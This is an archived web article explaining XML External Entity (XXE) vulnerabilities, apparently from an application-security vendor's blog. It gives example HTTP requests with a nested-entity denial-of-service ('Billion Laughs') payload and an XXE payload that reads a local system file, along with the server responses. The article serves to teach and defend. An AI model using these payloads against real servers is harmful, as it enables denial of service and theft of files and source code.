# What Is XML External Entity (XXE)?

_Captured: 2017-07-15 at 10:11 from [dzone.com](https://dzone.com/articles/what-is-xml-external-entity-xxe?oid=twitter&utm_content=buffer522d5&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer)_

XML External Entity (XXE) refers to a specific type of [Server-Side Request Forgery (SSRF)](https://dzone.com/articles/what-is-server-side-request-forgery-ssrf) attack, whereby an attacker is able to cause Denial of Service (DoS) and access local or remote files and services, by abusing a widely available, rarely used feature in XML parsers.

XML is a vastly used data format found in everything from web services (XML-RPC, SOAP, REST, etc.) to documents (XML, HTML, DOCX) and image files (SVG, EXIF data, etc.) use XML. Naturally, where there is XML, there is an XML parser - hold onto that thought, we'll be coming back to it shortly.

The following is an example of a simple web application that accepts XML input, parses it, and outputs the result.

Request Response
    
    
    POST http://example.com/xml HTTP/1.1
    
    
    <foo>
    
    
    Hello World
    
    
    </foo>

  

    
    
    HTTP/1.0 200 OK
    
    
    Hello World

XML, however, can do much more than simply declare elements, attributes, and text. XML documents can specify a set of markup declarations that define a document type, in order for an XML parser to validate the XML document for correctness before it gets processed. There are two ways of doing this - either through an XML Schema Definition (XSD), or a Data Type Definition (DTD).

Data Type Definitions (DTDs), are what we shall be focusing on since that's where XML External Entity vulnerabilities occur. DTDs can, pretty much, be considered legacy, in fact, they are derived from SGML (XML's ancestor).

The following is an example of a Data Type Definition (DTD) called `foo` with an element called`bar`, which is now an alias of the word "World." Therefore, anytime `&bar;` is used, the XML parser will replace that entity with the word "World."

Request Response
    
    
    POST http://example.com/xml HTTP/1.1
    
    
    <!DOCTYPE foo [
    
    
      <!ELEMENT foo ANY>
    
    
      <!ENTITY bar "World">
    
    
    ]>
    
    
    <foo>
    
    
      Hello &bar;
    
    
    </foo>

  
  

    
    
    HTTP/1.0 200 OK
    
    
    Hello World

  
  
  
  
  
  
  


While this initially seems harmless, XML entities can be used by an attacker to cause a Denial of Service attack by embedding entities within entities within entities. This attack is commonly referred to as the "[Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs)." Some XML parsers automatically limit the amount of memory they can use.

Request Response
    
    
    POST http://example.com/xml HTTP/1.1
    
    
    <!DOCTYPE foo [
    
    
      <!ELEMENT foo ANY>
    
    
      <!ENTITY bar "World ">
    
    
      <!ENTITY t1 "&bar;&bar;">
    
    
      <!ENTITY t2 "&t1;&t1;&t1;&t1;">
    
    
      <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
    
    
    ]>
    
    
    <foo>
    
    
      Hello &t3;
    
    
    </foo>

  

    
    
    HTTP/1.0 200 OK
    
    
    Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World

  
  
  
  


XML entities, however, can be used for much more than Denial of Service since XML entities do not necessarily have to be defined **in the XML document**. In fact, XML entities can come from just about anywhere - including **external sources**, hence the name XML External Entity (XXE). This is where XXE becomes a type of [Server-Side Request Forgery (SSRF) attack](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/).

![XML External Entity](https://www.acunetix.com/wp-content/uploads/2017/07/image1.png)

An attacker can make the following request, and if the XML parser is configured to process external entities (by default, many popular XML parsers are configured to do so), it will return the contents of a file on the system.

Request Response
    
    
    POST http://example.com/xml HTTP/1.1
    
    
    <!DOCTYPE foo [
    
    
      <!ELEMENT foo ANY>
    
    
      <!ENTITY bar SYSTEM
    
    
      "file:///etc/lsb-release">
    
    
    ]>
    
    
    <foo>
    
    
      &bar;
    
    
    </foo>

  
  

    
    
    HTTP/1.0 200 OK
    
    
    DISTRIB_ID=Ubuntu
    
    
    DISTRIB_RELEASE=16.04
    
    
    DISTRIB_CODENAME=xenial
    
    
    DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"

  
  
  
  
  


Of course, an attacker is not limited to system files. An attacker can easily steal source code if they know the location and structure of the web application. It's also worth mentioning, that with some XML parsers, it's even possible to get directory listings in addition to the contents of a file.

XML External Entity can be taken even further by making regular HTTP requests to files on the **local** network (i.e. accessible only behind the firewall).
